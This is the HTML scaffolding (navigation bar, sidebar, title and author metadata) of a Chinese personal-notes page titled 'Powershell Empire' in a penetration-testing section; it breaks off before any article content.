href="/dailynotes/assets/index.html-Bf3qVCiD.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-Yb5EJiSJ.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CXpJSO40.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CoBEiFwx.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DnpyuE9V.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CGbIZqSh.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DcnoggZI.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-oivdIzo8.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BZfu3E1c.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DiZgpBjM.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-weNCmaFw.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-uKfOmSdk.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DymsSWuK.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-xegqoPVT.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CKvlMfdS.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-Dnit3u7-.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DuzNT8fy.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BOP1_I-r.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CKeA-1P3.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CqBCqaZb.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BK01cIhO.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DHlPJFZy.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CriA5jwe.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DLwuRFWT.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CRNyUFbZ.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-cW1LC0kk.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-Bk2EPbWF.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DTCl-of6.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-LDhqszS_.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CAZe0H06.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CPDpMZQ7.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-sZFPwDR_.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DwAm4xlf.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DGrCU9AN.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DPIbsHvf.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DzViDnxz.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DEY4BJp-.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-Djh0Rz-x.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CZa-YdfD.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-D9yuMa0Q.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-kGtcWhLk.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BJ1f_VKC.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-C8mZsDiJ.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-B7zGZhAi.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-C7nGxRHh.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-DA-ahVuj.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-_oHHBwPS.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-CFsHV9Od.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BzZR6ben.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-D0If7aCo.js" as="script"><link rel="prefetch" href="/dailynotes/assets/index.html-BHGNZhV3.js" as="script"><link rel="prefetch" href="/dailynotes/assets/mermaid.esm.min-D1jiWb5u.js" as="script"><link rel="prefetch" href="/dailynotes/assets/photoswipe.esm-GXRgw7eJ.js" as="script"><link rel="prefetch" href="/dailynotes/assets/SearchResult-DMu9VBFJ.js" as="script"><link rel="prefetch" href="/dailynotes/assets/setupDevtools-7MC2TMWH-CY1hfh6-.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><!--[--><div class="theme-container external-link-icon has-toc" vp-container><!--[--><header id="navbar" class="vp-navbar" vp-navbar><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!----><!--[--><a class="route-link vp-brand" href="/dailynotes/" aria-label="带我回家"><img class="vp-nav-logo" src="/dailynotes/logo.svg" alt><!----><span class="vp-site-name hide-in-pad">DailyNotes</span></a><!--]--><!----></div><div class="vp-navbar-center"><!----><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="笔记工具"><!--[--><!---->笔记工具<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/NoteTools/VuePress.html" aria-label="VuePress"><!---->VuePress<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/NoteTools/Markdown.html" aria-label="Markdown"><!---->Markdown<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/NoteTools/Mermaid.html" aria-label="Mermaid"><!---->Mermaid<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/NoteTools/LaTex/" aria-label="LaTeX"><!---->LaTeX<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/NoteTools/PlantUML.html" aria-label="PlantUML"><!---->PlantUML<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/NoteTools/VitePress.html" aria-label="VitePress"><!---->VitePress<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="通识"><!--[--><!---->通识<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E9%80%9A%E8%AF%86.html" aria-label="通识"><!---->通识<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/Linux/" aria-label="Linux"><!---->Linux<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/Windows.html" aria-label="Windows"><!---->Windows<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/macOS/macOS.html" aria-label="macOS"><!---->macOS<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/Docker/Docker.html" aria-label="Docker"><!---->Docker<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/ClashVergeRev.html" aria-label="ClashVergeRev"><!---->ClashVergeRev<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/VSCode.html" aria-label="VSCode"><!---->VSCode<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E6%8D%A2%E6%BA%90.html" aria-label="换源"><!---->换源<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E5%A4%96%E8%AE%BE.html" aria-label="外设"><!---->外设<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" aria-label="正则"><!---->正则<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/RSS.html" aria-label="RSS"><!---->RSS<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E9%80%9A%E8%AF%86/%E6%B8%90%E6%9E%84-%E6%96%AD%E5%A2%A8%E5%AF%BB%E5%BE%84.html" aria-label="渐构"><!---->渐构<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="日常"><!--[--><!---->日常<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/DailyLife/DailyLife.html" aria-label="日常"><!---->日常<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/DailyLife/%E9%A3%9F%E8%B0%B1/" aria-label="食谱"><!---->食谱<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="网络安全"><!--[--><!---->网络安全<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link route-link-active auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" aria-label="网络安全"><!---->网络安全<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/" aria-label="钓鱼"><!---->钓鱼<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Tools/kali.html" aria-label="Tools"><!---->Tools<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/" aria-label="Web安全"><!---->Web安全<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%AB%AF%E7%82%B9%E5%AE%89%E5%85%A8/" aria-label="端点安全"><!---->端点安全<!----></a></li><li class="vp-dropdown-item"><a class="route-link route-link-active auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="内网渗透"><!---->内网渗透<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/AFL__/" aria-label="漏洞挖掘"><!---->漏洞挖掘<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BC%96%E7%A0%81.html" aria-label="编码"><!---->编码<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/网络安全/抓包发包.html" aria-label="抓包发包"><!---->抓包发包<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ATTCK/" aria-label="ATTCK"><!---->ATTCK<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/nmap.html" aria-label="信息收集"><!---->信息收集<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" aria-label="加密算法"><!---->加密算法<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%80%86%E5%90%91/%E9%80%86%E5%90%91.html" aria-label="逆向工程"><!---->逆向工程<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="Language"><!--[--><!---->Language<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/Python/QuickStart.html" aria-label="Python"><!---->Python<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/CPlusPlus/CPP.html" aria-label="C++"><!---->C++<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/Go/" aria-label="Go"><!---->Go<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/JavaScript/JavaScript.html" aria-label="JavaScript"><!---->JavaScript<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/TypeScript/TypeScript.html" aria-label="TypeScript"><!---->TypeScript<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/Java/Java.html" aria-label="Java"><!---->Java<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/PHP/PHP%E5%AD%A6%E4%B9%A0.html" aria-label="PHP"><!---->PHP<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Language/Shell/Shell/" aria-label="Shell"><!---->Shell<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="后端"><!--[--><!---->后端<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/" aria-label="后端"><!---->后端<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/FastAPI/" aria-label="FastAPI"><!---->FastAPI<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/Flask/Flask.html" aria-label="Flask"><!---->Flask<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%90%8E%E7%AB%AF/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93.html" aria-label="数据库"><!---->数据库<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="前端"><!--[--><!---->前端<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/%E9%80%9A%E8%AF%86.html" aria-label="通识"><!---->通识<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/HTML.html" aria-label="HTML"><!---->HTML<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/HTTP/%E8%B5%84%E6%BA%90%E5%92%8CURI.html" aria-label="HTTP"><!---->HTTP<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/VUE/Vue3/%E7%AE%80%E4%BB%8B.html" aria-label="Vue"><!---->Vue<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/CSS.html" aria-label="CSS"><!---->CSS<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/Nodejs.html" aria-label="Nodejs"><!---->Nodejs<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%89%8D%E7%AB%AF/Nginx.html" aria-label="Nginx"><!---->Nginx<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="GIt"><!--[--><!---->GIt<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Git/" aria-label="Git"><!---->Git<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Git/Github.html" aria-label="Github"><!---->Github<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/Git/Gitlab.html" aria-label="Gitlab"><!---->Gitlab<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="娱乐"><!--[--><!---->娱乐<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%A8%B1%E4%B9%90/Bot/" aria-label="Bot"><!---->Bot<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/%E5%A8%B1%E4%B9%90/sovits/sovits_32k.html" aria-label="sovits"><!---->sovits<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="人工智能"><!--[--><!---->人工智能<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/AI/AI.html" aria-label="AI"><!---->AI<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/AI/%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%9F%BA%E7%A1%80/%E5%A4%A7%E6%A8%A1%E5%9E%8B.html" aria-label="概念与基础"><!---->概念与基础<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/AI/%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%AE%9E%E8%B7%B5.html" aria-label="工具与实践"><!---->工具与实践<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/dailynotes/AI/%E6%8F%90%E7%A4%BA%E4%B8%8E%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/%E5%85%A8%E5%B1%80%E6%8F%90%E7%A4%BA%E8%AF%8D.html" aria-label="提示与交互方法"><!---->提示与交互方法<!----></a></li></ul></button></div></div></nav><!--]--><!----></div><div class="vp-navbar-end"><!----><!--[--><!----><div class="vp-nav-item vp-action"><a class="vp-action-link" href="https://github.com/233Official/dailynotes" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" name="github" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="vp-nav-item hide-in-mobile"><button type="button" class="vp-outlook-button" tabindex="-1" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" class="icon outlook-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="outlook icon" name="outlook"><path d="M224 800c0 9.6 3.2 44.8 6.4 54.4 6.4 48-48 76.8-48 76.8s80 41.6 147.2 0 134.4-134.4 38.4-195.2c-22.4-12.8-41.6-19.2-57.6-19.2C259.2 716.8 227.2 761.6 224 800zM560 675.2l-32 51.2c-51.2 51.2-83.2 32-83.2 32 25.6 67.2 0 112-12.8 128 25.6 6.4 51.2 9.6 80 9.6 54.4 0 102.4-9.6 150.4-32l0 0c3.2 0 3.2-3.2 3.2-3.2 22.4-16 12.8-35.2 6.4-44.8-9.6-12.8-12.8-25.6-12.8-41.6 0-54.4 60.8-99.2 137.6-99.2 6.4 0 12.8 0 22.4 0 12.8 0 38.4 9.6 48-25.6 0-3.2 0-3.2 3.2-6.4 0-3.2 3.2-6.4 3.2-6.4 6.4-16 6.4-16 6.4-19.2 9.6-35.2 16-73.6 16-115.2 0-105.6-41.6-198.4-108.8-268.8C704 396.8 560 675.2 560 675.2zM224 419.2c0-28.8 22.4-51.2 51.2-51.2 28.8 0 51.2 22.4 51.2 51.2 0 28.8-22.4 51.2-51.2 51.2C246.4 470.4 224 448 224 419.2zM320 284.8c0-22.4 19.2-41.6 41.6-41.6 22.4 0 41.6 19.2 41.6 41.6 0 22.4-19.2 41.6-41.6 41.6C339.2 326.4 320 307.2 320 284.8zM457.6 208c0-12.8 12.8-25.6 25.6-25.6 12.8 0 25.6 12.8 25.6 25.6 0 12.8-12.8 25.6-25.6 25.6C470.4 233.6 457.6 220.8 457.6 208zM128 505.6C128 592 153.6 672 201.6 736c28.8-60.8 112-60.8 124.8-60.8-16-51.2 16-99.2 16-99.2l316.8-422.4c-48-19.2-99.2-32-150.4-32C297.6 118.4 128 291.2 128 505.6zM764.8 86.4c-22.4 19.2-390.4 518.4-390.4 518.4-22.4 28.8-12.8 76.8 22.4 99.2l9.6 6.4c35.2 22.4 80 12.8 99.2-25.6 0 0 6.4-12.8 9.6-19.2 54.4-105.6 275.2-524.8 288-553.6 6.4-19.2-3.2-32-19.2-32C777.6 76.8 771.2 80 764.8 86.4z"></path></svg><div class="vp-outlook-dropdown"><!----></div></button></div><!--[--><button type="button" class="slimsearch-button" aria-label="搜索"><svg xmlns="http://www.w3.org/2000/svg" class="icon search-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="search icon"><path d="M192 480a256 256 0 1 1 512 0 256 256 0 0 1-512 0m631.776 362.496-143.2-143.168A318.464 318.464 0 0 0 768 480c0-176.736-143.264-320-320-320S128 303.264 128 480s143.264 320 320 320a318.016 318.016 0 0 0 184.16-58.592l146.336 146.368c12.512 12.48 32.768 12.48 45.28 0 12.48-12.512 12.48-32.768 0-45.28"></path></svg><div class="slimsearch-placeholder">搜索</div><div class="slimsearch-key-hints"><kbd class="slimsearch-key">Ctrl</kbd><kbd class="slimsearch-key">K</kbd></div></button><!--]--><!--]--><!----><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar" vp-sidebar><!----><ul class="vp-sidebar-links"><li><a class="route-link auto-link vp-sidebar-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="内网渗透"><!---->内网渗透<!----></a></li><li><section class="vp-sidebar-group"><p class="vp-sidebar-header"><!----><span class="vp-sidebar-title">代理转发</span><!----></p><ul class="vp-sidebar-links"><li><a class="route-link auto-link vp-sidebar-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" aria-label="代理转发"><!---->代理转发<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/SSH%E9%9A%A7%E9%81%93.html" aria-label="SSH隧道"><!---->SSH隧道<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/NATBypass.html" aria-label="NATBypass"><!---->NATBypass<!----></a></li></ul></section></li><li><a class="route-link route-link-active auto-link vp-sidebar-link active" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/C2/Powershell-Empire.html" aria-label="PowershellEmpire"><!---->PowershellEmpire<!----></a></li><li><a class="route-link auto-link vp-sidebar-link" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/SSH%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html" aria-label="横向移动"><!---->横向移动<!----></a></li></ul><!----></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!----><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->Powershell Empire</h1><div class="page-info"><span class="page-author-info" aria-label="作者🖊" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon" name="author"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://233official.github.io/dailynotes/" target="_blank" rel="noopener noreferrer">咸鱼型233</a></span><span property="author" content="咸鱼型233"></span></span><!----><span class="page-date-info" aria-label="写作日期📅" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon" name="calendar"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span data-allow-mismatch="text">2023年4月21日</span><meta property="datePublished" content="2023-04-21T09:53:53.000Z"></span><!----><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon" name="timer"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 24 分钟</span><meta property="timeRequired" content="PT24M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc" vp-toc><!----><div class="vp-toc-header">此页内容<button type="button" class="print-button" title="打印"><svg 